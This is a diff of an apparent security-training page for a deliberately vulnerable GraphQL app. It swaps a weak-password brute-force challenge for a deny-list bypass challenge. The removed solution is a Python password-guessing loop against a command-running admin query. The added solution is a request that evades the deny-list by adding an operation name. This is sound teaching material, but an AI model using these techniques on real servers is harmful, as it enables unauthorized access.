@@ -1,38 +1,52 @@
 <!-- Start -->
-<h3 style="color:purple" id="misc-weakpass"><b>Miscellaneous :: GraphQL Query Weak Password Protection</b></h3>
+<h3 style="color:purple" id="bypassauthz-denylist"><b>GraphQL Query Deny List Bypass</b></h3>
 <hr />
 <h5>Problem Statement</h5>
 <p>
-  The query <code>systemDiagnostics</code> is an administrative functionality that allows running a subset of system
-  commands on the server. The query is governed by a username and password before processing the
-  command.
+  Creating an <b>allow-list</b> or <b>deny-list</b> for GraphQL is a common technique to prevent malicious queries from
+  being resolved by GraphQL.
+</p>
+<ul>
+  <li>
+    By defining an <b>allow-list</b>, the application server will have a "known good" queries it will allow, and
+    reject anything else.
+  </li>
+  <li>
+    By defining a <b>deny-list</b>, the application server will have a "known bad" queries it will reject, and allow
+    anything else.
+  </li>
+</ul>
+<p>
+  In general, the allow-list approach is easier to maintain and less error-prone, since we only allow certain things we
+  trust. It does not mean it cannot have flaws too.
 </p>
 <p>
-  The password is weak, and the server has no rate limiting protections. This allows attackers to easily conduct brute
-  force attacks against the server.</p>
+  The application has a deny-list mechanism implemented that attempts to reject Health queries using the
+  <code>systemHealth</code> query.
+</p>
+<p>
+  The problem with this mechanism is that it does not take into consideration queries can have <a href="https://graphql.org/learn/queries/#operation-name" target="_blank">operation names</a>.
+</p>
 <h5>Resources</h5>
 <ul>
   <li>
-    <a href="https://cwe.mitre.org/data/definitions/307.html" target="_blank">
-      <i class="fa fa-newspaper"></i> CWE-307 - Improper Restriction of Excessive Authentication Attempts
+    <a href="https://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries-16130a324a6b/" target="_blank">
+      <i class="fa fa-newspaper"></i> Apollo - Securing your GraphQL From Malicious Queries
+    </a>
+  </li>
+  <li>
+    <a href="https://cwe.mitre.org/data/definitions/184.html" target="_blank">
+      <i class="fa fa-newspaper"></i> CWE-184: Incomplete List of Disallowed Inputs
     </a>
   </li>
 </ul>
-<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-misc-weakpass')">Show</button></h5>
-<div id="sol-misc-weakpass" style="display:none">
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-denylist')">Show</button></h5>
+<div id="sol-brokenauthz-denylist" style="display:none">
   <pre class="bash">
-    # Brute Force attack with a list of passwords:
-    passwordlist = ['admin123', 'pass123', 'adminadmin', '123']
+# Expert mode
 
-    for password in passwordlist:
-      resp = requests.post('http://host/graphql',
-      json = {
-        "query":"query {\n  systemDiagnostics(username:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),
-        "variables":None
-      })
+# Query systemHealth directly by calling /graphql and supplying an arbitrary operation name.
 
-      if not 'errors' in resp.text:
-        print('Password is', password)
-  </pre>
+requests.post('http://host/graphql', json={"query":"query BypassMe{systemHealth}"}, headers={'X-DVGA-MODE':'Expert'})</pre>
 </div>
 <!-- End -->
